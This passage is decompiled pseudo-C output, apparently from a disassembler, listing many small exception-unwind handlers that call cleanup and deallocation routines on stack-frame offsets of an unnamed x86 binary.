  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4017(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x158));
  return;
}



void Unwind_003c4022(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x154));
  return;
}



void Unwind_003c402d(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4038(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c4043(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x154));
  return;
}



void Unwind_003c404e(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4059(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x154));
  return;
}



void Unwind_003c4064(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c406f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c407a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x14c));
  return;
}



void Unwind_003c4085(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c4090(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c409b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40a6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40b1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40bc(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40c7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40d2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40dd(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40e8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40f3(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c40fe(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c4109(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c4114(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c4150(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xb50));
  return;
}



void Unwind_003c415b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xb34));
  return;
}



void Unwind_003c4166(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xb18));
  return;
}



void Unwind_003c4171(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xb88));
  return;
}



void Unwind_003c417c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xb88));
  return;
}



void __fastcall Unwind_003c41b0(undefined4 param_1)

{
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(unaff_EBP + -0x44);
  if (*ppvVar1 != (void *)0x0) {
    FUN_00389fb0();
    FUN_003aee4b(*ppvVar1);
  }
  *ppvVar1 = (void *)0x0;
  *(undefined4 *)(unaff_EBP + -0x40) = 0;
  *(undefined4 *)(unaff_EBP + -0x3c) = 0;
  return;
}



void Unwind_003c41b8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x30));
  return;
}



void Unwind_003c41f0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x105c));
  return;
}



void Unwind_003c41fb(void)

{
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(unaff_EBP + -0x108c);
  if (*ppvVar1 != (void *)0x0) {
    FUN_00398480();
    FUN_003aee4b(*ppvVar1);
  }
  *ppvVar1 = (void *)0x0;
  *(undefined4 *)(unaff_EBP + -0x1088) = 0;
  *(undefined4 *)(unaff_EBP + -0x1084) = 0;
  return;
}



void Unwind_003c4206(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c4211(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1078));
  return;
}



void Unwind_003c421c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1024));
  return;
}



void Unwind_003c4227(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1008));
  return;
}



void Unwind_003c4232(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xfec));
  return;
}



void Unwind_003c423d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1040));
  return;
}



void Unwind_003c4248(void)

{
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(unaff_EBP + -0xfc4);
  if (*ppvVar1 != (void *)0x0) {
    FUN_00398480();
    FUN_003aee4b(*ppvVar1);
  }
  *ppvVar1 = (void *)0x0;
  *(undefined4 *)(unaff_EBP + -0xfc0) = 0;
  *(undefined4 *)(unaff_EBP + -0xfbc) = 0;
  return;
}



void Unwind_003c4253(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c425e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1078));
  return;
}



void Unwind_003c4269(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1040));
  return;
}



void Unwind_003c4274(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xfec));
  return;
}



void Unwind_003c427f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1008));
  return;
}



void Unwind_003c428a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1024));
  return;
}



void Unwind_003c42c0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x23c));
  return;
}



void Unwind_003c4300(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0x48));
  return;
}



void Unwind_003c4308(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0x2c));
  return;
}



void Unwind_003c4310(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0x10));
  return;
}



void Unwind_003c4318(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x558));
  return;
}



void Unwind_003c4323(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x5c8));
  return;
}



void Unwind_003c432e(void)

{
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(unaff_EBP + -0x654);
  if (*ppvVar1 != (void *)0x0) {
    FUN_00398480();
    FUN_003aee4b(*ppvVar1);
  }
  *ppvVar1 = (void *)0x0;
  *(undefined4 *)(unaff_EBP + -0x650) = 0;
  *(undefined4 *)(unaff_EBP + -0x64c) = 0;
  return;
}



void Unwind_003c4339(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c4344(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x600));
  return;
}



void Unwind_003c434f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x638));
  return;
}



void Unwind_003c435a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x61c));
  return;
}



void Unwind_003c4365(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x574));
  return;
}



void Unwind_003c4370(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x590));
  return;
}



void Unwind_003c437b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x53c));
  return;
}



void Unwind_003c4386(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x520));
  return;
}



void Unwind_003c4391(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x590));
  return;
}



void Unwind_003c439c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x590));
  return;
}



void Unwind_003c43a7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x520));
  return;
}



void Unwind_003c43b2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x53c));
  return;
}



void Unwind_003c43bd(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x590));
  return;
}



void Unwind_003c43c8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x520));
  return;
}



void Unwind_003c43d3(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x53c));
  return;
}



void Unwind_003c4410(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c441b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c4426(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c4431(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c443c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c4447(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c4452(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c445d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c4468(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c4473(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x187d4));
  return;
}



void Unwind_003c44b0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 8));
  return;
}



void Unwind_003c44e0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c44eb(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c44f6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4501(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c450c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4517(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4522(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c452d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4538(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4543(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c454e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4559(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4564(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c456f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c457a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4585(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4590(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c459b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c45a6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c45b1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c45bc(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c45c7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c45d2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c45dd(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c45e8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c45f3(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c45fe(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4609(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4614(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c461f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c462a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4635(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4640(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c464b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4656(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4661(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c466c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4677(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4682(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c468d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4698(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c46a3(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c46ae(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c46b9(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c46c4(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c46cf(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c46da(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c46e5(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c46f0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c46fb(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4706(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4711(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c471c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4727(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4732(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c473d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4748(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4753(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c475e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4769(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4774(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c477f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c478a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4795(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c47a0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c47ab(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c47b6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c47c1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c47cc(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c47d7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c47e2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c47ed(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c47f8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4803(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c480e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4819(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4824(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c482f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c483a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4845(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4850(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c485b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4866(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4871(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c487c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4887(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4892(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c489d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c48a8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c48b3(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c48be(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c48c9(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c48d4(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c48df(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c48ea(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c48f5(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4900(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c490b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4916(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4921(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c492c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4937(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4942(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c494d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4958(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4963(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c496e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4979(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4984(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c498f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c499a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c49a5(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c49b0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c49bb(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c49c6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c49d1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c49dc(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c49e7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c49f2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c49fd(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4a08(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4a13(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4a1e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4a29(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4a34(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4a3f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4a4a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4a55(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4a60(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4a6b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4a76(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4a81(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4a8c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4a97(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4aa2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4aad(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4ab8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4ac3(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4ace(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4ad9(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4ae4(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4aef(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4afa(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4b05(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4b10(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4b1b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4b26(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4b31(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4b3c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
